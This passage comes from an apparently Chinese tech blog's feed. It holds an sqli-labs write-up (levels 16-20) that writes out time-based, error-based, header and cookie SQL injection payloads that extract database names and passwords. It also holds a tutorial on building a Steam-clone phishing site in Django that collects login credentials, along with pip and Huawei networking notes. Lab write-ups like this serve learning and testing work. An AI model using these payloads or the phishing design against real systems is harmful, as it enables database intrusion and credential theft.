        <content type="html"><![CDATA[<h1 id="一、报错信息"><a href="#一、报错信息" class="headerlink" title="一、报错信息"></a>一、报错信息</h1><p>ERROR: Could not build wheels for opencv-python-headless which use PEP 517 and cannot be installed directly</p><h1 id="二、结局方法"><a href="#二、结局方法" class="headerlink" title="二、结局方法"></a>二、结局方法</h1><p>更新pip<br>命令：<code>pip install --upgrade pip</code></p><h1 id="三、参考文章"><a href="#三、参考文章" class="headerlink" title="三、参考文章"></a>三、参考文章</h1><p><a href="https://blog.csdn.net/qq_24568487/article/details/122132833">https://blog.csdn.net/qq_24568487/article/details/122132833</a><br><a href="https://blog.csdn.net/z704630835/article/details/124564044">https://blog.csdn.net/z704630835/article/details/124564044</a><br>感谢两位佬的经验分享。</p>]]></content>
      
      
      <categories>
          
          <category> 答疑 </category>
          
          <category> Yunzai-Bot </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 答疑 </tag>
            
            <tag> Yunzai-Bot </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SQL注入靶场（四）</title>
      <link href="/2022/09/10/sql_lab_four/"/>
      <url>/2022/09/10/sql_lab_four/</url>
      
        <content type="html"><![CDATA[<h1 id="一、实操环境"><a href="#一、实操环境" class="headerlink" title="一、实操环境"></a>一、实操环境</h1><h2 id="1、操作系统"><a href="#1、操作系统" class="headerlink" title="1、操作系统"></a>1、操作系统</h2><ol><li>VMware虚拟机创建的win10系统</li><li>内存8GB</li><li>硬盘255GB</li><li>处理器AMD Ryzen 9 5900HX</li></ol><h2 id="2、操作项目"><a href="#2、操作项目" class="headerlink" title="2、操作项目"></a>2、操作项目</h2><p><strong>sql-lib项目，本篇文章介绍关卡16-20。</strong></p><h2 id="3、工具版本"><a href="#3、工具版本" class="headerlink" title="3、工具版本"></a>3、工具版本</h2><ol><li><p>phpstudy 8.1.1.3</p></li><li><p>php版本 5.4.45nts</p></li><li><p>Apache2.4.39</p></li><li><p>MySQL5.7.26</p></li><li><p>Chrome</p></li></ol><h2 id="4、SQL注入目的"><a href="#4、SQL注入目的" class="headerlink" title="4、SQL注入目的"></a>4、SQL注入目的</h2><ol><li>判断是否允许注入</li><li>判断注入点类型</li><li>判断回显点</li><li>获取数据库信息</li><li>获取表信息 </li><li>获取字段信息</li></ol><h1 id="二、less16"><a href="#二、less16" class="headerlink" title="二、less16"></a>二、less16</h1><h2 id="1、判断注入"><a href="#1、判断注入" class="headerlink" title="1、判断注入"></a>1、判断注入</h2><p>输入了admin’、admin”以及加上各种括号都不显示，可能是延迟注入，和15关一样，不一样的是这里为双引号盲注。</p><h2 id="2、获取数据库信息"><a href="#2、获取数据库信息" class="headerlink" title="2、获取数据库信息"></a>2、获取数据库信息</h2><p>输入admin’’ and if(substr((select database()),1,1)&#x3D;’s’,sleep(5),1)#&#x3D;&#x3D;也可以用ascii判断&#x3D;&#x3D;</p><h2 id="3、获取表信息"><a href="#3、获取表信息" class="headerlink" title="3、获取表信息"></a>3、获取表信息</h2><p>输入admin’’ and if((select count(*)from information_schema.tables where table_schema&#x3D;database())&#x3D;4,sleep(5),1)#</p><h1 id="三、less17"><a href="#三、less17" class="headerlink" title="三、less17"></a>三、less17</h1><h2 id="1、判断注入-1"><a href="#1、判断注入-1" class="headerlink" title="1、判断注入"></a>1、判断注入</h2><p>这一关就得多试试了，毕竟之前都是在username输入的，但不要忘记password输入框，在尝试过程中，无论username输入什么，回显都不变，那可能是在password存在注入点，尝试在password输入之前的东西，发现报错了，基于报错信息，可以知道是单引号注入，而且是报错注入。</p><h2 id="2、获取数据库信息-1"><a href="#2、获取数据库信息-1" class="headerlink" title="2、获取数据库信息"></a>2、获取数据库信息</h2><p>利用extractvalue（）报错注入，可以得到数据库名。<br>passwd&#x3D;1’ and extractvalue(1,concat(‘<del>‘,(select database()),’</del>‘))#<br><img src="http://120.48.107.243:9090/blog/2023/04/03/d4dd09e894904ff3a4d8a40b981d2be5.png" alt="在这里插入图片描述"></p><h2 id="3、获取表信息-1"><a href="#3、获取表信息-1" class="headerlink" title="3、获取表信息"></a>3、获取表信息</h2><p>在passwd中，换成1’ and extractvalue(1,concat(‘<del>‘,(select table_name from information_schema.tables where table_schema&#x3D;database() limit 0,1),’</del>‘))#，就可以得到表名。<br><img src="http://120.48.107.243:9090/blog/2023/04/03/11345570cf934c89a5a02b8359658674.png" alt="在这里插入图片描述"></p><h2 id="4、获取列信息"><a href="#4、获取列信息" class="headerlink" title="4、获取列信息"></a>4、获取列信息</h2><p>1’  and extractvalue(1,concat(‘<del>‘,(select column_name from information_schema.columns where table_schema&#x3D;database() and table_name&#x3D;’users’ limit 0,1),’</del>‘))#<br><img src="http://120.48.107.243:9090/blog/2023/04/03/d74f153217c84ad3af96975a7c8ec621.png" alt="在这里插入图片描述"></p><h2 id="5、获取用户名密码"><a href="#5、获取用户名密码" class="headerlink" title="5、获取用户名密码"></a>5、获取用户名密码</h2><p>passwd&#x3D;1’ and updatexml(1,concat(0x7e,(select password from (select password from security.users limit 0,1)users),0x7e),1)#&amp;submit&#x3D;Submit<br><img src="http://120.48.107.243:9090/blog/2023/04/03/b4d179da2d0c4ecc83c38a4b90831d78.png" alt="在这里插入图片描述"></p><h1 id="四、less18"><a href="#四、less18" class="headerlink" title="四、less18"></a>四、less18</h1><h2 id="1、判断注入-2"><a href="#1、判断注入-2" class="headerlink" title="1、判断注入"></a>1、判断注入</h2><p>经过测试，登录成功后显示IP地址和浏览器版本信息，登录失败只显示ip地址，而在账户名和密码后加上’#，但都被转义了，所以不能使用sql注入，最后测试发现可以在http头部UA注入。</p><h2 id="2、获取数据库信息-2"><a href="#2、获取数据库信息-2" class="headerlink" title="2、获取数据库信息"></a>2、获取数据库信息</h2><p>抓包发送到重发器，然后修改UA头。<br><img src="http://120.48.107.243:9090/blog/2023/04/03/5fa313e1578e4e9d874fc76a58aeabfd.png" alt="在这里插入图片描述"></p><p>可以看到库名<br><img src="http://120.48.107.243:9090/blog/2023/04/03/9eb58b4fa21b4871900d146d39aceba1.png" alt="在这里插入图片描述"></p><h2 id="3、获取表信息-2"><a href="#3、获取表信息-2" class="headerlink" title="3、获取表信息"></a>3、获取表信息</h2><p>‘or updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema&#x3D;’security’  limit 3,1),0x7e),1) or ‘1’&#x3D;’1<br><img src="http://120.48.107.243:9090/blog/2023/04/03/a819fa89d94041a3a5c792924b8a4f01.png" alt="在这里插入图片描述"></p><h2 id="4、获取列信息-1"><a href="#4、获取列信息-1" class="headerlink" title="4、获取列信息"></a>4、获取列信息</h2><p>‘or updatexml(1,concat(0x7e,(select column_name from information_schema.columns where table_name&#x3D;’users’  limit 4,1),0x7e),1) or ‘1’&#x3D;’1<img src="http://120.48.107.243:9090/blog/2023/04/03/6f75d021382d4669802c6fded84c770d.png" alt="在这里插入图片描述"></p><h2 id="5、获取字段信息"><a href="#5、获取字段信息" class="headerlink" title="5、获取字段信息"></a>5、获取字段信息</h2><p>‘or updatexml(1,concat(0x7e,(select password from security.users limit 0,1),0x7e),1) or ‘1’&#x3D;’1<br><img src="http://120.48.107.243:9090/blog/2023/04/03/5404a1f884e04f06a34d08d4156bf0bd.png" alt="在这里插入图片描述"></p><h1 id="五、less19"><a href="#五、less19" class="headerlink" title="五、less19"></a>五、less19</h1><h2 id="1、判断注入-3"><a href="#1、判断注入-3" class="headerlink" title="1、判断注入"></a>1、判断注入</h2><p>这一关和上一关类似，只是登录成功返回信息不一样，而且这一关是referer注入。</p><h2 id="2、获取数据库信息-3"><a href="#2、获取数据库信息-3" class="headerlink" title="2、获取数据库信息"></a>2、获取数据库信息</h2><p>抓包，发送给重发器。<br>将referer改为1’,extractvalue(1,concat(0x5e,database())))#，获取到数据库名。<br><img src="http://120.48.107.243:9090/blog/2023/04/03/dc4d2294c4974dc5ad9a7d9784ca6bee.png" alt="在这里插入图片描述"></p><h2 id="3、获取表信息-3"><a href="#3、获取表信息-3" class="headerlink" title="3、获取表信息"></a>3、获取表信息</h2><p>1’,extractvalue(1,concat(0x5e,(select group_concat(table_name) from information_schema.tables where table_schema &#x3D; database()))))#<br><img src="http://120.48.107.243:9090/blog/2023/04/03/75370b89c89c4bf7b4d1e66e5fdd1538.png" alt="在这里插入图片描述"></p><h2 id="4、获取字段信息"><a href="#4、获取字段信息" class="headerlink" title="4、获取字段信息"></a>4、获取字段信息</h2><p>1’,extractvalue(1,concat(0x5e,(select group_concat(column_name) from information_schema.columns where table_schema &#x3D; database() and table_name &#x3D; ‘users’))))#<br><img src="http://120.48.107.243:9090/blog/2023/04/03/ad567a487c534336bf7679b3da3313b3.png" alt="在这里插入图片描述"></p><h2 id="5、获取详细信息"><a href="#5、获取详细信息" class="headerlink" title="5、获取详细信息"></a>5、获取详细信息</h2><p>1’,extractvalue(1,concat(0x5e,(select group_concat(password) from users))))#<br><img src="http://120.48.107.243:9090/blog/2023/04/03/4f0dcca56a4d4abf968314b8b3a82658.png" alt="在这里插入图片描述"></p><h1 id="六、less20"><a href="#六、less20" class="headerlink" title="六、less20"></a>六、less20</h1><h2 id="1、判断注入-4"><a href="#1、判断注入-4" class="headerlink" title="1、判断注入"></a>1、判断注入</h2><p>这一关是cookie存在注入，同样适用bp抓包。</p><h2 id="2、获取数据库信息-4"><a href="#2、获取数据库信息-4" class="headerlink" title="2、获取数据库信息"></a>2、获取数据库信息</h2><p>这里注意识别一下，我这边是第二个数据包。更改cookie为uname&#x3D;-admin’ union select 1,2,database()–+<img src="http://120.48.107.243:9090/blog/2023/04/03/7dfbb15cc0fe43eea2bc5dabbbb197e0.png" alt="在这里插入图片描述"><br><img src="http://120.48.107.243:9090/blog/2023/04/03/fe821a0162c545708b3f73b6710c7724.png" alt="在这里插入图片描述"></p><h2 id="3、获取表信息-4"><a href="#3、获取表信息-4" class="headerlink" title="3、获取表信息"></a>3、获取表信息</h2><p>更改uname&#x3D;Dumb’ and updatexml(1,concat(0x5e,(select table_name from information_schema.tables where table_schema&#x3D;database() limit 3,1),0x5e),1) #<br><img src="http://120.48.107.243:9090/blog/2023/04/03/5d0ab2f878e444d2a7bfde8a12266d71.png" alt="在这里插入图片描述"></p><h2 id="4、获取字段名"><a href="#4、获取字段名" class="headerlink" title="4、获取字段名"></a>4、获取字段名</h2><p>更改uname&#x3D;Dumb’ and updatexml(1,concat(0x5e,(select column_name from information_schema.columns where table_schema&#x3D;database() and table_name&#x3D;’users’ limit 1,1),0x5e),1) #<br><img src="http://120.48.107.243:9090/blog/2023/04/03/7a26d2deaab84d729b53bcf2f0f7a185-20230403143503570.png" alt="在这里插入图片描述"></p><h2 id="5、获取字段值"><a href="#5、获取字段值" class="headerlink" title="5、获取字段值"></a>5、获取字段值</h2><p>uname&#x3D;Dumb’ and updatexml(1,concat(0x5e,(select username from users limit 0,1),0x5e),1) #<br><img src="http://120.48.107.243:9090/blog/2023/04/03/afa5ed919e7f48ae882a7e9b1b9bff2d.png" alt="在这里插入图片描述"></p><h1 id="七、总结与小记"><a href="#七、总结与小记" class="headerlink" title="七、总结与小记"></a>七、总结与小记</h1><p>本篇文章是sql-lib的16关到20关，有什么问题请留言，万分感谢。</p>]]></content>
      
      
      <categories>
          
          <category> 信息安全 </category>
          
          <category> 打靶记录 </category>
          
          <category> SQL注入靶场 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 信息安全 </tag>
            
            <tag> 打靶记录 </tag>
            
            <tag> SQL注入靶场 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>钓鱼软件的编写</title>
      <link href="/2022/09/04/fish_software_write/"/>
      <url>/2022/09/04/fish_software_write/</url>
      
        <content type="html"><![CDATA[<p><img src="http://120.48.107.243:9090/blog/2023/04/03/b9634b8a1b114264b50f327d5f17a286.png" alt="在这里插入图片描述"></p><p><strong>本篇文章仅用于学习交流，不得用于其他违规用途。</strong></p><h2 id="1、钓鱼软件是什么？"><a href="#1、钓鱼软件是什么？" class="headerlink" title="1、钓鱼软件是什么？"></a>1、钓鱼软件是什么？</h2><p><em><strong>钓鱼软件是通常以精心设计的虚假网页引诱用户上当,达到盗取银行账号、信用卡号码等目的,属于违法行为。</strong></em><br>钓鱼通常指伪装成银行及电子商务,窃取用户提交的银行帐号、密码等私密信息的网站,可用电脑管家进行查杀。</p><h2 id="2、为什么有钓鱼软件？"><a href="#2、为什么有钓鱼软件？" class="headerlink" title="2、为什么有钓鱼软件？"></a>2、为什么有钓鱼软件？</h2><p>不法分子用于骗取受害人的个人信息，利用受害者爱贪小便宜的心理。<br>红蓝对抗中获取信息的一种手段。</p><h2 id="3、编写一个简单的钓鱼软件"><a href="#3、编写一个简单的钓鱼软件" class="headerlink" title="3、编写一个简单的钓鱼软件"></a>3、编写一个简单的钓鱼软件</h2><h3 id="（1）易语言编写简单的钓鱼软件"><a href="#（1）易语言编写简单的钓鱼软件" class="headerlink" title="（1）易语言编写简单的钓鱼软件"></a>（1）易语言编写简单的钓鱼软件</h3><h4 id="a-易语言简介"><a href="#a-易语言简介" class="headerlink" title="a.易语言简介"></a>a.易语言简介</h4><p>易语言（EPL）是一门以中文作为程序代码<a href="https://baike.baidu.com/item/%E7%BC%96%E7%A8%8B?fromModule=lemma_inlink">编程</a>语言，其以“<a href="https://baike.baidu.com/item/%E6%98%93/416877?fromModule=lemma_inlink">易</a>”著称，创始人为<a href="https://baike.baidu.com/item/%E5%90%B4%E6%B6%9B/13580434?fromModule=lemma_inlink">吴涛</a>。易语言早期版本的名字为E语言，也通常代指与之对应的<a href="https://baike.baidu.com/item/%E9%9B%86%E6%88%90%E5%BC%80%E5%8F%91%E7%8E%AF%E5%A2%83/298524?fromModule=lemma_inlink">集成开发环境</a>。其最早的版本的发布可追溯至2000年9月11日。创造易语言的初衷是进行用中文来编写程序的实践，方便中国人以中国人的思维编写程序，并不用再去学习西方思维。</p><h4 id="b-安装易语言"><a href="#b-安装易语言" class="headerlink" title="b.安装易语言"></a>b.安装易语言</h4><p><img src="http://120.48.107.243:9090/blog/2023/04/03/a02dab14bb69e908dd6c64546f06d9dc.png"></p><p><img src="http://120.48.107.243:9090/blog/2023/04/03/271ccb8fc43afa51a1080e130000ecc3.png"></p><h4 id="c-开启qq邮箱的相关设置，获取授权码"><a href="#c-开启qq邮箱的相关设置，获取授权码" class="headerlink" title="c.开启qq邮箱的相关设置，获取授权码"></a>c.开启qq邮箱的相关设置，获取授权码</h4><h4 id="d-画出框体"><a href="#d-画出框体" class="headerlink" title="d.画出框体"></a>d.画出框体</h4><p><img src="http://120.48.107.243:9090/blog/2023/04/03/9f9a0e5beafd4fbf3b0f279d230d7121.png"></p><p><img src="http://120.48.107.243:9090/blog/2023/04/03/a7960bda555fb1a9ebdc44994fb0b47e-20230403124503237.png"></p><h4 id="e-编写程序"><a href="#e-编写程序" class="headerlink" title="e.编写程序"></a>e.编写程序</h4><p><img src="http://120.48.107.243:9090/blog/2023/04/03/f1c99068fd2a4e4d61b5770fa840a007.png"></p><p><img src="http://120.48.107.243:9090/blog/2023/04/03/e156c13a0805f88ca14ac3b61fc9b7f8.png"></p><h4 id="f-测试成功"><a href="#f-测试成功" class="headerlink" title="f.测试成功"></a>f.测试成功</h4><p><img src="http://120.48.107.243:9090/blog/2023/04/03/bcd5349e4ebc49c771a7c008396a329e.png"></p><h3 id="（2）Python-Django编写钓鱼软件"><a href="#（2）Python-Django编写钓鱼软件" class="headerlink" title="（2）Python+Django编写钓鱼软件"></a>（2）Python+Django编写钓鱼软件</h3><h4 id="a-Django简介"><a href="#a-Django简介" class="headerlink" title="a.Django简介"></a>a.Django简介</h4><p>Django是一个开放<a href="https://baike.baidu.com/item/%E6%BA%90%E4%BB%A3%E7%A0%81/3814213?fromModule=lemma_inlink">源代码</a>的<a href="https://baike.baidu.com/item/Web%E5%BA%94%E7%94%A8%E6%A1%86%E6%9E%B6/4262233?fromModule=lemma_inlink">Web应用框架</a>，由<a href="https://baike.baidu.com/item/Python/407313?fromModule=lemma_inlink">Python</a>写成。采用了MTV的框架模式，即模型M，视图V和模版T。它最初是被开发来用于管理劳伦斯出版集团旗下的一些以新闻内容为主的网站的，即是CMS（内容管理系统）软件。</p><h4 id="b-安装Django模块"><a href="#b-安装Django模块" class="headerlink" title="b.安装Django模块"></a>b.安装Django模块</h4><p>pip3 install django&#x3D;&#x3D;3.0</p><p><img src="http://120.48.107.243:9090/blog/2023/04/03/ac9db9eb40cd73ba78eda3282d330d8c.png"></p><h4 id="c-创建Django项目"><a href="#c-创建Django项目" class="headerlink" title="c.创建Django项目"></a>c.创建Django项目</h4><p>django-admin startproject steam_web </p><p><img src="http://120.48.107.243:9090/blog/2023/04/03/dc0bdec4a3d383241f6a20044f88462c.png"></p><p><img src="http://120.48.107.243:9090/blog/2023/04/03/d98714f99ca263d14c6c859160c17f40.png"></p><h4 id="d-创建子应用"><a href="#d-创建子应用" class="headerlink" title="d.创建子应用"></a>d.创建子应用</h4><p>cd steam_web<br>python3 manage.py startapp login</p><p><img src="http://120.48.107.243:9090/blog/2023/04/03/bbec83404289950616492273c25abf87.png"></p><p>完成后会生成一个login的文件夹</p><p><img src="http://120.48.107.243:9090/blog/2023/04/03/ce452a6f46e6404516c95a203a5158c6.png"></p><p>这个文件夹下我们需要用到models.py（数据模型）和view.py（用来控制页面逻辑）</p><p><img src="http://120.48.107.243:9090/blog/2023/04/03/c986247b3f8b45f13192435c43e89317.png"></p><h4 id="e-查看环境是否配置成功"><a href="#e-查看环境是否配置成功" class="headerlink" title="e.查看环境是否配置成功"></a>e.查看环境是否配置成功</h4><p>使用pycharm打开这个项目，然后运行。</p><p><img src="http://120.48.107.243:9090/blog/2023/04/03/92b724aa766e741fd586c278126284f7.png"></p><p><img src="http://120.48.107.243:9090/blog/2023/04/03/11641bf0b70dba34b6e281e72e196c6f.png"></p><p>打开这个链接，发现成功：</p><p><img src="http://120.48.107.243:9090/blog/2023/04/03/8d020722b91885e8a7abfee60fce412f.png"></p><h4 id="f-修改setting-py文件"><a href="#f-修改setting-py文件" class="headerlink" title="f.修改setting.py文件"></a>f.修改setting.py文件</h4><p><img src="http://120.48.107.243:9090/blog/2023/04/03/77ec73b78b6273a82c54032e287fee2b.png"></p><p><img src="http://120.48.107.243:9090/blog/2023/04/03/f229a5fece2ab3248e51437271a8575a.png"></p><p>配置网站默认语言、时间</p><p><img src="http://120.48.107.243:9090/blog/2023/04/03/0fcf28a0caeef6c13b06a4662385ee1c.png"></p><p><img src="http://120.48.107.243:9090/blog/2023/04/03/1a7a1bf470f88aab93a1154e4e869320.png"></p><p>刷新页面就变成中文了。</p><p><img src="http://120.48.107.243:9090/blog/2023/04/03/2663b5a4b04aa3d15fa02843177d3597.png"></p><h4 id="g-导入所需文件"><a href="#g-导入所需文件" class="headerlink" title="g.导入所需文件"></a>g.导入所需文件</h4><p>这里从把steam官网扒下来，然后修改配置文件。</p><p><img src="http://120.48.107.243:9090/blog/2023/04/03/783eff57100f062c1187fec7133152e6.png"></p><p><img src="https://img-blog.csdnimg.cn/img_convert/255fdbc3c77ceeef1a4f5436c514cbad.png"></p><p>还需要更改html对应的参数。</p><h4 id="h-编写数据模型"><a href="#h-编写数据模型" class="headerlink" title="h.编写数据模型"></a>h.编写数据模型</h4><p>打开models.py文件，去创建一个模型类。</p><p><img src="http://120.48.107.243:9090/blog/2023/04/03/3de62a668742718acd65f23ae3e81973.png"></p><h4 id="i-编写视图"><a href="#i-编写视图" class="headerlink" title="i.编写视图"></a>i.编写视图</h4><p>打开view.py文件，编写视图，是控制网站与用户的交互逻辑。</p><p><img src="http://120.48.107.243:9090/blog/2023/04/03/d9e062825dec537ca8262d0c0e08a296.png"></p><h4 id="j-在urls-py文件里编写路由"><a href="#j-在urls-py文件里编写路由" class="headerlink" title="j.在urls.py文件里编写路由"></a>j.在urls.py文件里编写路由</h4><p><img src="http://120.48.107.243:9090/blog/2023/04/03/a3eb46320a30e08ee78d6d1914a0dc00.png"></p><h4 id="k-同步数据库"><a href="#k-同步数据库" class="headerlink" title="k.同步数据库"></a>k.同步数据库</h4><p>这里使用自带的sqlite3，文件型小型数据库</p><p><img src="http://120.48.107.243:9090/blog/2023/04/03/c1638f69d88bc6c578a5aa78376442a1.png"></p><p>打开后，输入makemigrations，这是将数据模型中的字段编译成一个Python脚本，包含sql语言。</p><p><img src="http://120.48.107.243:9090/blog/2023/04/03/18b8675d7a174be452e3cb106f5e3941.png"></p><p>执行后会生成一个0001_initial.py文件</p><p><img src="http://120.48.107.243:9090/blog/2023/04/03/0cf34702a2ffa83832080bc5dc6407ce.png"></p><p>然后再执行脚本，输入migrate将数据模型映射到数据库中。</p><p><img src="http://120.48.107.243:9090/blog/2023/04/03/7891d72a45244b9c03769c6d22b9247f.png"></p><p><img src="http://120.48.107.243:9090/blog/2023/04/03/20279ef4633fce7db3af1bfeefde315c.png"></p><h4 id="l-测试成功"><a href="#l-测试成功" class="headerlink" title="l.测试成功"></a>l.测试成功</h4><p><img src="http://120.48.107.243:9090/blog/2023/04/03/ca1987399d51384464485fb9f9374d52.png"></p><p><img src="http://120.48.107.243:9090/blog/2023/04/03/70f92b23b3e94ff8c93573a165379053.png"></p>]]></content>
      
      
      <categories>
          
          <category> 折腾 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 折腾日记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ensp配置旁挂三层组网示例</title>
      <link href="/2022/08/14/ensp_three_study/"/>
      <url>/2022/08/14/ensp_three_study/</url>
      
        <content type="html"><![CDATA[<h1 id="ensp配置旁挂三层组网示例【OSPF-两个无线网络WPAPSK认证-DHCP】"><a href="#ensp配置旁挂三层组网示例【OSPF-两个无线网络WPAPSK认证-DHCP】" class="headerlink" title="ensp配置旁挂三层组网示例【OSPF+两个无线网络WPAPSK认证+DHCP】"></a>ensp配置旁挂三层组网示例【OSPF+两个无线网络WPAPSK认证+DHCP】</h1><h1 id="一、业务需求"><a href="#一、业务需求" class="headerlink" title="一、业务需求"></a>一、业务需求</h1><p>1、路由使用OSPF，Vlan的网关配置在LSW1上。<br>2、WLan采用三层组网、AC旁挂模式。<br>3、创建两个无线网络，分别为ycu和guest，其中ycu网络的密码为“peiyimiao”，业务数据采用直接转发模式；guest网络的密码为guest，业务数据采用隧道转发模式。<br>4、DHCP配置在AC上，给AP使用的DHCP名为ap，给ycu使用的DHCP名为ycu，给guest使用的DHCP名为guest。<br>5、配置AP1的2.4G频段使用信道1,5G频段使用信道149；配置AP2的2.4G频段使用信道6,5G频段使用信道36.<br>6、无线终端STA1连接ycu网络，无线终端STA2连接guest网络，和PC1之间可以互相ping通。</p><h1 id="二、组网规划"><a href="#二、组网规划" class="headerlink" title="二、组网规划"></a>二、组网规划</h1><p>1、AC组网方式：旁挂三层组网。</p><p>2、业务数据转发方式：ycu为直接转发，guest为隧道转发。</p><p>3、DHCP部署方式：AC作为DHCP服务器为AP和STA分配IP地址。</p><p>4、AP管理：VLAN 50，网段为10.10.25.0&#x2F;24。</p><p>5、ycu网络：VLAN 51，SSID为“ycu”，密码为“peiyimiao”。<br>6、guest网络：VLAN 52，SSID为“guest”，密码为“guest”。</p><p>AC与AP建立管理隧道的源接口：AC上的VLANIF2。</p><p>AC与汇聚交换机三层互联的接口：VLANIF2。</p><p>LSW1交换机与出口网关（AR1）互联的接口：VLANIF </p><h1 id="三、地址规划"><a href="#三、地址规划" class="headerlink" title="三、地址规划"></a>三、地址规划</h1><p><img src="https://img-blog.csdnimg.cn/15451b68cc6a41979fbc6c507a817e57.png" alt="在这里插入图片描述"></p><h1 id="四、拓扑图"><a href="#四、拓扑图" class="headerlink" title="四、拓扑图"></a>四、拓扑图</h1><p><img src="http://120.48.107.243:9090/blog/2023/04/01/7067a34d98484525848871510925b0d3.png" alt="在这里插入图片描述"></p><h1 id="五、基本配置"><a href="#五、基本配置" class="headerlink" title="五、基本配置"></a>五、基本配置</h1><h2 id="1、AC基本属性："><a href="#1、AC基本属性：" class="headerlink" title="1、AC基本属性："></a>1、AC基本属性：</h2><p>型号：AC6005<br>组网方式：三层组网旁挂<br>业务数据转发方式：ycu为直接转发，guest为隧道转发<br>DHCP部署：VLAN51网段给ycu分配地址，VLAN52网段给guest分配地址<br>两个无线网络：SSID：ycu 密码：peiyimiao2021 SSID：guest 密码：guest2021<br>管理源接口：VLAN50<br>管理模板：domain1</p><h2 id="2、AP认证配置："><a href="#2、AP认证配置：" class="headerlink" title="2、AP认证配置："></a>2、AP认证配置：</h2><p>AP认证方式为mac地址认证</p><h2 id="3、AP组："><a href="#3、AP组：" class="headerlink" title="3、AP组："></a>3、AP组：</h2><p>创建了一个AP组：ap-group1</p><h2 id="4、SSID模板："><a href="#4、SSID模板：" class="headerlink" title="4、SSID模板："></a>4、SSID模板：</h2><p>SSID：ycu 密码：peiyimiao2021 SSID：guest 密码：guest2021</p><h2 id="5、VAP模板："><a href="#5、VAP模板：" class="headerlink" title="5、VAP模板："></a>5、VAP模板：</h2><p>vap-profile name ycu  与 vap-profile name guest</p><h1 id="六、操作步骤"><a href="#六、操作步骤" class="headerlink" title="六、操作步骤"></a>六、操作步骤</h1><h2 id="1、配置流程说明"><a href="#1、配置流程说明" class="headerlink" title="1、配置流程说明"></a>1、配置流程说明</h2><p>（1）配置LSW2和LSW3两个二层交换机：配置好vlan和接口。<br>（2）配置LSW1汇聚三层交换机：配置vlan、接口、vlanif、ospf<br>（3）配置ACL：配置vlan、接口、vlanif、dhcp、ap组、domain管理模板、源接口、ap的mac认证、创建ssid模板，创建vap模板、创建安全模板、将安全模板应用到vap模板上、关闭自动调频，手动配置ap频段信道、配置AP组引用域管理模板和vap模板。<br>（4）配置AR1：配置端口IP，开启ospf。<br>（5）配置AR2：配置端口IP，开启ospf。<br>（6）配置PC1：配置IP地址和网关。</p><h2 id="2、配置LSW1"><a href="#2、配置LSW1" class="headerlink" title="2、配置LSW1"></a>2、配置LSW1</h2><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">Huawei</span>&gt;</span>sys</span><br><span class="line">关闭提示</span><br><span class="line">[Huawei]undo info enable</span><br><span class="line">改名字</span><br><span class="line">[Huawei]sys LSW1</span><br><span class="line">创建vlan50到53</span><br><span class="line">[LSW1]vlan batch 50 to 53</span><br><span class="line">进入接口0/0/4</span><br><span class="line">[LSW1]inter g 0/0/4</span><br><span class="line">配置trunk以及允许通过vlan</span><br><span class="line">[LSW1-GigabitEthernet0/0/4]port link-type trunk </span><br><span class="line">[LSW1-GigabitEthernet0/0/4]port trunk allow-pass vlan 50 to 52</span><br><span class="line">[LSW1]inter g 0/0/3</span><br><span class="line">配置trunk以及允许通过vlan</span><br><span class="line">[LSW1-GigabitEthernet0/0/4]inter g 0/0/3</span><br><span class="line">[LSW1-GigabitEthernet0/0/3]port link-type trunk </span><br><span class="line">[LSW1-GigabitEthernet0/0/3]port trunk allow-pass vlan 50 to 52</span><br><span class="line">[LSW1]inter g 0/0/2</span><br><span class="line">配置trunk以及允许通过vlan</span><br><span class="line">[LSW1-GigabitEthernet0/0/3]inter g 0/0/2</span><br><span class="line">[LSW1-GigabitEthernet0/0/2]port link-type trunk </span><br><span class="line">[LSW1-GigabitEthernet0/0/2]port trunk allow-pass vlan 50 to 52</span><br><span class="line">[LSW1-GigabitEthernet0/0/2]q</span><br><span class="line">配置vlanif地址</span><br><span class="line">[LSW1]inter vlan50</span><br><span class="line">[LSW1-Vlanif50]ip add 10.10.25.1 24</span><br><span class="line">[LSW1-Vlanif50]inter vlan51</span><br><span class="line">[LSW1-Vlanif51]ip add 10.10.26.1 24</span><br><span class="line">[LSW1-Vlanif51]inter vlan52</span><br><span class="line">[LSW1-Vlanif52]ip add 10.10.27.1 24</span><br><span class="line">[LSW1]inter vlan 53</span><br><span class="line">[LSW1-Vlanif53]ip add 10.10.28.1 24</span><br><span class="line">[LSW1-Vlanif53]q</span><br><span class="line">[LSW1]inter g 0/0/0</span><br><span class="line">配置access以及允许通过vlan</span><br><span class="line">[LSW1]inter g 0/0/1</span><br><span class="line">[LSW1-GigabitEthernet0/0/1]port link-type access </span><br><span class="line">[LSW1-GigabitEthernet0/0/1]port default vlan 53</span><br><span class="line">配置ospf</span><br><span class="line">[LSW1]ospf</span><br><span class="line">[LSW1-ospf-1]area 0</span><br><span class="line">[LSW1-ospf-1-area-0.0.0.0]network 10.10.25.0 0.0.0.255</span><br><span class="line">[LSW1-ospf-1-area-0.0.0.0]network 10.10.26.0 0.0.0.255</span><br><span class="line">[LSW1-ospf-1-area-0.0.0.0]network 10.10.27.0 0.0.0.255</span><br><span class="line">[LSW1-ospf-1-area-0.0.0.0]network 10.10.28.0 